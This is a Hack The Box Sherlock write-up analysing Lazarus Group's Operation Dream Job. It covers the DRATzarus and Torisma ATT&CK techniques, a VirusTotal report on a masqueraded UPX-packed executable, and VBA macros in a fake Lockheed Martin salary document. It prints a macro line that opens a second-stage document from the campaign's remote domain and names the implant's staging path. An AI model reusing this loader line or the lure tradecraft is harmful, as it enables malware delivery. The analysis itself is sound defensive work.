## Background

Dream Job 2 is a Hack The Box Sherlock — a guided threat intelligence and malware analysis investigation centred on the Lazarus Group's Operation Dream Job campaign. Unlike forensic Sherlocks that hand you log files or disk images, this one requires open-source intelligence research across MITRE ATT&CK and VirusTotal, combined with hands-on analysis of weaponised documents. The Lazarus Group (also tracked as HIDDEN COBRA) is a North Korean state-sponsored APT that has been active since at least 2009, responsible for operations ranging from the Sony Pictures hack to the WannaCry ransomware outbreak. Operation Dream Job was a targeted campaign against defence and aerospace employees, using fake job offers from major defence contractors as social engineering lures to deliver malware. The investigation traces two of their custom malware families — DRATzarus and Torisma — through MITRE ATT&CK, analyses a malicious ISO file on VirusTotal, and dissects VBA macros inside a weaponised document disguised as a Lockheed Martin salary offer.

## Researching DRATzarus on MITRE ATT&CK

The first phase of the investigation focuses on DRATzarus, one of the custom remote access tools deployed by the Lazarus Group during Operation Dream Job. Navigating to the MITRE ATT&CK entry for DRATzarus (ID: S0694) provides the baseline intelligence. The description is immediately informative — DRATzarus is classified as a RAT (Remote Access Tool) targeting the Windows platform, used by Lazarus Group to target defence and aerospace organisations globally since at least summer 2020. The critical detail sits right in the opening paragraph: DRATzarus "shares similarities with Bankshot," another Lazarus Group tool that was used in 2017 to target the Turkish financial sector. This code lineage between DRATzarus and Bankshot confirms that the Lazarus Group reuses and evolves their tooling across campaigns spanning years.

![MITRE ATT&CK page for DRATzarus showing the description stating it is a remote access tool used by Lazarus Group to target defence and aerospace organisations globally since at least summer 2020, with "shares similarities with Bankshot" highlighted. The sidebar shows ID S0694, Type MALWARE, Platforms Windows, Version 1.1, Created 24 March 2022, Last Modified 16 April 2025.](/writeups/htb-dream-job-2/01.png)

Scrolling down to the Techniques Used table reveals DRATzarus's operational capabilities mapped to ATT&CK techniques. Three entries stand out — T1071.001 Application Layer Protocol: Web Protocols, showing that DRATzarus uses HTTP and HTTPS for command-and-control communication, blending its traffic with normal web browsing. T1005 Data from Local System confirms the RAT collects information from compromised hosts. But the most relevant entry for the investigation is T1622 Debugger Evasion, which specifies that DRATzarus uses the **IsDebuggerPresent** Windows API call to detect whether it's running inside a debugger environment before executing its malicious payload. This is a classic anti-analysis technique — if IsDebuggerPresent returns true, the malware knows it's being examined by a reverse engineer and can alter its behaviour or simply exit to avoid exposing its capabilities.

![DRATzarus Techniques Used table from MITRE ATT&CK showing three entries — T1071.001 Application Layer Protocol: Web Protocols describing HTTP and HTTPS usage for C2 communication, T1005 Data from Local System for collecting information from compromised hosts, and T1622 Debugger Evasion with IsDebuggerPresent highlighted as the specific API call used.](/writeups/htb-dream-job-2/02.png)

## Torisma malware techniques

The investigation moves to Torisma, the second malware family associated with Operation Dream Job. Torisma is a second-stage implant — where DRATzarus handles initial access and data collection, Torisma provides persistent monitoring capabilities with more sophisticated evasion. The MITRE ATT&CK Techniques Used table for Torisma is considerably more extensive than DRATzarus, reflecting its role as a more capable implant.

The first page of techniques covers the communication and obfuscation layer. T1071.001 Application Layer Protocol: Web Protocols appears again — HTTP and HTTPS for C2, consistent across both tools. T1132.001 Standard Encoding shows Torisma uses Base64 to encode C2 communications. T1140 Deobfuscate/Decode Files or Information lists both XOR and Base64 for decoding C2 data. The key finding is T1573.001 Encrypted Channel: Symmetric Cryptography, which reveals that Torisma uses both XOR and **VEST-32** encryption for its encrypted C2 channel. VEST-32 is a relatively obscure stream cipher — its appearance here is distinctive enough to serve as a signature for Torisma's communications.

![Torisma Techniques Used table from MITRE ATT&CK showing T1071.001 Web Protocols for HTTP/HTTPS C2, T1132.001 Standard Encoding with Base64 for C2, T1140 Deobfuscate/Decode listing XOR and Base64 for C2 data, and T1573.001 Symmetric Cryptography with "XOR and VEST-32" highlighted as the encryption algorithms.](/writeups/htb-dream-job-2/03.png)

The second page of Torisma's techniques maps out its host reconnaissance and persistence capabilities in detail. T1480 Execution Guardrails shows Torisma uses IP allow-listing to ensure it only executes on intended targets — a surgical approach that prevents accidental detonation in sandbox environments or on analyst machines. T1041 Exfiltration Over C2 Channel confirms data theft goes back through the same C2 connection. T1680 Local Storage Discovery lists GetLogicalDrives and GetDriveType — APIs used to enumerate all mounted volumes and determine their types (fixed, removable, network). T1106 Native API indicates heavy use of raw Windows API calls rather than higher-level abstractions, a common trait in sophisticated malware that wants fine-grained control. The critical finding here is T1027.002 Software Packing, which identifies **lz4 compression** as Torisma's packing method. LZ4 is an extremely fast compression algorithm — its use here prioritises speed over compression ratio, allowing Torisma to rapidly decompress its payload in memory. The remaining techniques round out Torisma's reconnaissance profile: T1027.013 Encrypted/Encoded File with Base64 and AES, T1016 System Network Configuration Discovery (GetAdaptersInfo), T1049 System Network Connections Discovery (WTSEnumerateSessionsW), and T1124 System Time Discovery.

![Second page of Torisma Techniques Used from MITRE ATT&CK showing T1573.001 Symmetric Cryptography, T1480 Execution Guardrails with IP allow-listing, T1041 Exfiltration Over C2, T1680 Local Storage Discovery listing GetLogicalDrives and GetDriveType, T1106 Native API, T1027.002 Software Packing with "lz4 compression" highlighted, T1027.013 Encrypted/Encoded File with Base64 and AES, T1016 System Network Configuration Discovery with GetAdaptersInfo, T1049 System Network Connections Discovery with WTSEnumerateSessionsW, and T1124 System Time Discovery.](/writeups/htb-dream-job-2/04.png)

## VirusTotal analysis of the malicious ISO

With the malware family research complete, the investigation shifts to analysing a malicious ISO file associated with the campaign on VirusTotal. ISO files have become a popular delivery mechanism for malware in recent years because they can be mounted as virtual drives on Windows without requiring third-party software, and historically they bypassed Mark-of-the-Web protections that would otherwise trigger SmartScreen warnings on files downloaded from the internet.

The Dropped Files section of the VirusTotal analysis lists 64 files extracted from the ISO. The list includes a mix of file types — GZIP archives, JSON configuration files, text files, a PDF (BAE_HPC_SE.pdf with 19/63 detections), BMP images, a PowerShell script (__PSScriptPolicyTest.npm.psm1), and Win32 executables. The file that immediately commands attention is **InternalViewer.exe**, flagged by 47 out of 70 security vendors as malicious. That detection ratio is overwhelming — when nearly 70% of antivirus engines agree something is malware, there's no ambiguity. The name "InternalViewer" is deliberately bland, chosen to look like a legitimate utility that might belong in a document package.

![VirusTotal Dropped Files analysis showing 64 files extracted from the ISO. The list shows various file types including GZIP, JSON, Text, PDF, BMP, PowerShell, and Win32 EXE. InternalViewer.exe is highlighted with 47 out of 70 security vendor detections. Other notable entries include BAE_HPC_SE.pdf at 19/63 detections, several SOPHIA.json entries, 000001.dbtmp, and __PSScriptPolicyTest.npm.psm1.](/writeups/htb-dream-job-2/05.png)

Opening the full VirusTotal detection page for InternalViewer.exe reveals much more about this binary. The hash is adce894e3ce69c9822da57196707c7a15acee11319ccc963b84d83c23c3ea802, the file weighs in at 10.02 MB, and the detection count is confirmed at 47/70. But the most telling details are in the metadata and tags. The filename field shows **SumatraPDF.exe** — this is the binary's original name before it was renamed to InternalViewer.exe for inclusion in the ISO. SumatraPDF is a legitimate, widely-used open-source PDF reader, and the attackers chose this name deliberately. If anyone inspected the executable's properties, they would see what appears to be a legitimate PDF viewer, lowering suspicion. This is a textbook example of masquerading (MITRE T1036) — disguising a malicious executable as trusted software.

The tags section provides additional forensic markers: `peexe` (Windows PE executable), `checks-cpu-name` (fingerprinting the processor, likely for sandbox detection), `upx` (packed with UPX), `detect-debug-environment` (anti-analysis capability consistent with IsDebuggerPresent), `64bits` (64-bit binary), and `corrupt` (structural anomalies, possibly from the packing process). The YARA rules section confirms the **UPX** match from the kevoreilly/CAPEv2 ruleset. UPX stands for **Ultimate Packer for Executables** — it's an open-source executable packer that compresses PE files and includes a decompression stub that restores the original binary in memory at runtime. While UPX is legitimate software used by developers to reduce binary size, malware authors frequently use it to obfuscate their payloads and evade static signature detection, since the compressed binary looks nothing like the original code.

![VirusTotal detection page for InternalViewer.exe showing hash adce894e3ce69c9822da57196707c7a15acee11319ccc963b84d83c23c3ea802, 47 out of 70 security vendors flagging it as malicious, filename SumatraPDF.exe, size 10.02 MB, with tags peexe, checks-cpu-name, upx, detect-debug-environment, 64bits, and corrupt. YARA rules section shows UPX match from kevoreilly/CAPEv2.](/writeups/htb-dream-job-2/06.png)

The History section of the VirusTotal page provides the timeline. Creation Time is 2020-05-12 19:26:17 UTC — when the binary was compiled. First Submission is 2020-06-05 — when someone (likely a security researcher or an automated sandbox) first uploaded it to VirusTotal. The critical timestamp is **First Seen In The Wild: 2020-08-13 08:44:50 UTC** — this is when VirusTotal's telemetry first observed this file being distributed or executed in a real-world context, outside of controlled analysis environments. The gap between compilation (May 2020) and wild deployment (August 2020) suggests the attackers staged the binary for about three months before deploying it operationally, possibly refining their delivery infrastructure or waiting for the right targets.

![VirusTotal History section showing Creation Time 2020-05-12 19:26:17 UTC, First Seen In The Wild 2020-08-13 08:44:50 UTC highlighted, First Submission 2020-06-05, Last Submission 2026-02-03, and Last Analysis 2026-01-13.](/writeups/htb-dream-job-2/07.png)

## VBA macro analysis of the weaponised document

The final phase of the investigation moves from network-delivered malware to the initial access vector itself — a weaponised Microsoft Word document named `Salary_Lockheed_Martin_job_opportunities_confidential.doc`. The filename is pure social engineering, designed to appeal to defence industry professionals who might be looking for new opportunities or curious about competitor salary ranges. Opening the document in LibreOffice and accessing the Object Catalog panel reveals that VBA macros are embedded directly in the document — the macro module appears under the document's name in the catalog tree, separate from the system-level "My Macros & Dialogs" and "Application Macros & Dialogs" entries.

![LibreOffice showing Salary_Lockheed_Martin_job_opportunities_confidential.doc with the Object Catalog panel open displaying My Macros & Dialogs, Application Macros & Dialogs, and the document's own macro module Salary_Lockheed_Martin_job_opportunities_ highlighted in the tree.](/writeups/htb-dream-job-2/08.png)

Examining the VBA macro source code reveals the operational logic of the first-stage payload. The visible code spans lines 113 through 139 and contains several functions working together. WMCheckURLScheme takes WMCreateFileSink as a parameter, and WMVdspa performs buffer operations using hexadecimal offset `&H100000` with variables named to mimic legitimate Windows Media Foundation functions — WMPlaybackRadd, Play_Decd_Rdh, WmEmptyData — a deliberate obfuscation strategy to make the macro appear related to media processing if casually inspected.

The conditional block at line 120 is a persistence trigger. It checks `ThisDocument.ReadOnly` — if the document has write access (ReadOnly is False), it calls WMCreateIndexer and saves the document with `ThisDocument.Save`. This means the macro modifies the document itself when opened with write permissions, potentially embedding additional payload data or updating its staging markers.

The most critical line is 126:

```
Application.Documents.Open ("https://markettrendingcenter.com/lk_job_oppor.docx")
```

This is the second-stage payload delivery. When the macro executes, it silently opens another Word document from `markettrendingcenter.com` — a domain registered specifically for this campaign. The second-stage document `lk_job_oppor.docx` (the "lk" likely abbreviating "Lockheed") would contain its own macros or exploit code to deliver the actual malware payload. Lines 127-129 handle cleanup — if the fetched document becomes the ActiveDocument, the original lure document closes itself, leaving only the weaponised payload open.

The WMIsAvailableOffline function at line 133 checks `ThisDocument.Variables("WMCreateFileSink").Value` against the string `"WMBackupSignal"`. This is where the macro references its persistence staging infrastructure. The variables tied to WMCreateFileSink and WMBackupSignal reference the suspicious directory **\AppData\Local\Microsoft\Notice** — a path that mimics legitimate Microsoft application data directories but doesn't correspond to any real Microsoft product. The suspicious file **wsuser.db** is checked for existence at this path — its `.db` extension suggests a SQLite or similar database file used to track the implant's state, store collected data, or maintain configuration between executions.

Document metadata analysis rounds out the investigation. The document author is listed as **Mickey** and the last modifier as **Challenger** — both are operational pseudonyms used by the threat actors during document preparation, and neither corresponds to real Lockheed Martin employees.

![VBA macro source code showing lines 113-139 with WMCheckURLScheme and WMVdspa functions performing buffer operations, a conditional block at line 120 checking ThisDocument.ReadOnly that triggers WMCreateIndexer and ThisDocument.Save, line 126 showing Application.Documents.Open("https://markettrendingcenter.com/lk_job_oppor.docx") in red, lines 127-129 checking ActiveDocument and closing ThisDocument, and the WMIsAvailableOffline function at line 133 checking WMCreateFileSink variable against WMBackupSignal string.](/writeups/htb-dream-job-2/09.png)

## What I took from this

Dream Job 2 is a pure threat intelligence and malware analysis exercise, and it exercises a completely different set of skills from the typical forensic Sherlock. There's no log file to grep through — the investigation requires navigating MITRE ATT&CK as a structured intelligence database, using VirusTotal as both a malware repository and a timeline tool, and reading VBA macros with enough understanding to identify payload delivery, persistence mechanisms, and obfuscation techniques.

The MITRE ATT&CK research phase reinforced how the framework isn't just a taxonomy — it's a searchable intelligence database. Knowing that DRATzarus maps to S0694 and looking up its techniques immediately revealed its relationship with Bankshot and its use of IsDebuggerPresent, while the Torisma entry exposed the distinctive VEST-32 cipher and lz4 packing. These aren't details anyone would memorise, but knowing where to find them and how to read the technique descriptions is what makes ATT&CK useful in practice.

The VirusTotal analysis demonstrated how much intelligence a single file upload can yield beyond just "is it malicious." The dropped files list from the ISO revealed the entire delivery package, the filename discrepancy between InternalViewer.exe and SumatraPDF.exe exposed the masquerading technique, the YARA rules confirmed the UPX packer, and the History section provided the operational timeline from compilation through wild deployment. The three-month gap between compilation and deployment is the kind of temporal intelligence that helps attribution analysts link campaigns to specific threat actor operational patterns.

The macro analysis was the most hands-on portion. The obfuscation strategy — naming everything after Windows Media Foundation functions — is effective at first glance but falls apart under any sustained reading. The second-stage URL at markettrendingcenter.com is where the real payload lives, and the entire macro is essentially a loader: check if we have write access, stage persistence markers in a fake Microsoft directory, fetch the real weapon, and close the decoy. The pseudonyms Mickey and Challenger in the document metadata are operational security failures by the threat actors — even small oversights in document metadata can become attribution evidence.
